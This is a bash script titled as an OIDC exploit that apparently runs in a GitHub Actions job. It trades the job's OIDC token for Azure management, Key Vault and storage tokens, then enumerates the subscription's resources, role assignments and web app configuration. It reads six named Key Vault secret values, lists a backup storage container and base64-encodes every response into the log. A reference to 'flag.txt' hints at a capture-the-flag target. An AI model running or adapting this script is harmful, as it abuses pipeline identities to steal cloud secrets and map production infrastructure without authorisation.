#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT v5 - DEEP ENUM ==="

T="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"
CID="${AZURE_CLIENT_ID}"

# Get OIDC + ARM token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')

ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
echo "arm_len=${#ARM}"

# 1) List ALL resources in subscription
echo "=== ALL RESOURCES ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | base64 -w0
echo ""

# 2) List ALL resource groups
echo "=== RESOURCE GROUPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | base64 -w0
echo ""

# 3) Role assignments scoped to the target storage account specifically
echo "=== RBAC ON APPCFG STORAGE ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | base64 -w0
echo ""

# 4) Check storage account properties (to see allowedCopyScope, networkAcls, etc.)
echo "=== STORAGE PROPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz?api-version=2023-01-01" | base64 -w0
echo ""

# 5) List ALL web apps in ALL resource groups
echo "=== WEB APPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2022-03-01" | base64 -w0
echo ""

# 6) Reporting app properties (different RG)
echo "=== REPORTING APP PROPS ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2022-03-01" | base64 -w0
echo ""

# 7) Reporting app identity (UAMI details)
echo "=== REPORTING APP IDENTITY ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/web?api-version=2022-03-01" | base64 -w0
echo ""

# 8) RBAC on reporting app RG
echo "=== RBAC ON REPORTING RG ==="
curl -sS -H "Authorization: Bearer $ARM" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | base64 -w0
echo ""

# 9) Get KV token and check KV-PROD for new secrets
OIDC2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC2" \
  -d "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
echo "kv_len=${#KV}"

echo "=== KV-PROD ALL SECRETS ==="
curl -sS -H "Authorization: Bearer $KV" \
  "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | base64 -w0
echo ""

# 10) Try reading each KV-PROD secret value (in case rotation happened)
for SN in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  echo "=== SECRET $SN ==="
  curl -sS -H "Authorization: Bearer $KV" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SN?api-version=7.4" | jq -r '.value // empty' | base64 -w0
  echo ""
done

# 11) List backup storage exports container blobs (try common names)
OIDC3=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
ST=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=$CID" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC3" \
  -d "scope=https://storage.azure.com/.default" | jq -r '.access_token // empty')
echo "st_len=${#ST}"

# Try backup storage exports with cicd token
echo "=== BACKUP EXPORTS LIST ==="
curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
  "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | base64 -w0
echo ""

# Try public access to exports container (no auth, just common names)
echo "=== PUBLIC BLOB GUESSES ==="
for NAME in config.json internal-config.json export.json backup.json data.json flag.txt settings.json nightly-export.json report.json; do
  CODE=$(curl -sS -o /dev/null -w "%{http_code}" --connect-timeout 3 -m 5 \
    "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$NAME")
  echo "exports/$NAME=$CODE"
done

echo ""
echo "=== DONE v5 ==="
